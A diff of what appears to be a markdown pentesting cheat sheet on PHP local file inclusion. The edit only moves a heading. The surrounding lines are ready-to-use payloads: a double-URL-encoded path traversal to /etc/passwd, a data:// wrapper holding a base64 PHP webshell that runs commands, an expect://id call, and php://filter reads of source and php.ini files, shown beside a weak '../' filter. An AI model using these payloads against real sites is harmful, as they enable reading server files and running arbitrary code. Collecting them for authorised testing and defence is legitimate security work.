@@ -533,7 +533,6 @@ $language = str_replace('../', '', $_GET['file']);
 
 %25%32%65%25%32%65%25%32%66%25%32%65%25%32%65%25%32%66%25%32%65%25%32%65%25%32%66%25%32%65%25%32%65%25%32%66%25%36%35%25%37%34%25%36%33%25%32%66%25%37%30%25%36%31%25%37%33%25%37%33%25%37%37%25%36%34
 
-#### Filter PHP
 
 data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8%2BCg%3D%3D&cmd=id
 expect://id
@@ -542,6 +541,8 @@ php://filter/read=convert.base64-encode/resource=index.php
 php://filter/read=convert.base64-encode/resource=../../../../etc/php/7.4/apache2/php.ini
 
 #### PHP Wrappers
+
+#### Filter PHP
 
 -> Predefined Paths
 
